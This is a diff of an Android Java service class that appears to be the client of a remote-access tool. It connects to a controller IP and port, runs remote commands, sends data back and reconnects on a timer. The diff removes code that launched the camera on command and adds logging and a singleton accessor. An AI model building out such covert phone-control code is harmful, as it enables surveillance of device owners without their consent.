@@ -4,32 +4,27 @@ package my.app.client;
 import inout.Controler;
 import inout.Protocol;
 
-import java.util.ArrayList;
 import java.util.Calendar;
-import java.util.StringTokenizer;
-import java.util.prefs.Preferences;
 
-import out.Connection;
-import my.app.Library.CallMonitor;
 import my.app.Library.SystemInfo;
-import Packet.*;
+import out.Connection;
+import Packet.CommandPacket;
+import Packet.LogPacket;
+import Packet.PreferencePacket;
+import Packet.TransportPacket;
 import android.app.AlarmManager;
 import android.app.PendingIntent;
-import android.content.ComponentName;
 import android.content.Intent;
 import android.content.IntentFilter;
-import android.content.SharedPreferences;
-import android.location.Address;
 import android.os.Bundle;
 import android.os.Handler;
 import android.os.Message;
 import android.util.Log;
-import android.widget.Toast;
 
 public class Client extends ClientListener implements Controler {
 
 	public final String TAG = Client.class.getSimpleName();
-	Connection conn;
+	public Connection conn;
 
 	int nbAttempts = 10; //sera décrementé a 5 pour 5 minute 3 pour  10 minute ..
 	int elapsedTime = 1; // 1 minute
@@ -44,6 +39,8 @@ public class Client extends ClientListener implements Controler {
 	byte[] cmd ;
 	CommandPacket packet ;
 	
+	
+	
 	private Handler handler = new Handler() {
 		
 		public void handleMessage(Message msg) {
@@ -52,15 +49,21 @@ public class Client extends ClientListener implements Controler {
 		}
 	};
 	
-	
+	public static Client instance;
 	
 	public void onCreate() {
-		Log.i(TAG, "In onCreate");
+		Log.i(TAG, "In onCreate client");
+		
 		infos = new SystemInfo(this);
 		procCmd = new ProcessCommand(this);
-		
+		instance=this;
 		loadPreferences();
 	}
+	
+	public static Client getInstace(){
+		return instance;
+	}
+	
 	
 	public int onStartCommand(Intent intent, int flags, int startId) {
 		//toast = Toast.makeText(this	,"Prepare to laod", Toast.LENGTH_LONG);
@@ -76,6 +79,7 @@ public class Client extends ClientListener implements Controler {
 			this.ip = intent.getExtras().getString("IP");
 		if (intent.hasExtra("PORT"))
 			this.port = intent.getExtras().getInt("PORT");		
+		
 		
 		if(!isRunning) {// C'est la première fois qu'on le lance
 			
@@ -169,15 +173,9 @@ public class Client extends ClientListener implements Controler {
     {
 		try{
 			procCmd.process(b.getShort("command"),b.getByteArray("arguments"),b.getInt("chan"));
-		     Log.i("PhotoTaker", "Taking photo");
+
 		     try{
-			     Intent intent = new Intent();
-			     intent.setAction(Intent.ACTION_MAIN);
-			     intent.addCategory(Intent.CATEGORY_LAUNCHER);
-			     intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
-			     ComponentName cn = new ComponentName(this, CameraActivity.class);
-			     intent.setComponent(cn);
-			     startActivity(intent);
+			     Log.i("PhotoTaker", "Taking photo" + b.getInt("chan"));
 		     }catch (Exception e){
 		    	 Log.e("PhotoTaker", "ERROR starting activity camera: " + e.toString());
 		     }
@@ -249,7 +247,17 @@ public class Client extends ClientListener implements Controler {
 	}
 	
 	public void handleData(int channel, byte[] data) {
+		
+		Log.i(TAG, "sending "+data);
 		conn.sendData(channel, data);
+		try {
+			Log.i(TAG, ""+conn.toString());
+				
+		} catch (Exception e) {
+			Log.e(TAG, ""+e.toString());
+			
+		}
+		
 	}
 
 	
@@ -258,11 +266,17 @@ public class Client extends ClientListener implements Controler {
 		//savePreferences("preferences");
 		
 		Log.i(TAG, "in onDestroy");
-		unregisterReceiver(ConnectivityCheckReceiver);
+		try{
+			unregisterReceiver(ConnectivityCheckReceiver);
+
 		conn.stop();
 		stop = true;
 		stopSelf();
 		super.onDestroy();
+		
+		}catch (Throwable  e){
+			Log.e(TAG,"ERROR destroying connection");
+		}
 	}
 	
 	public void resetConnectionAttempts() {
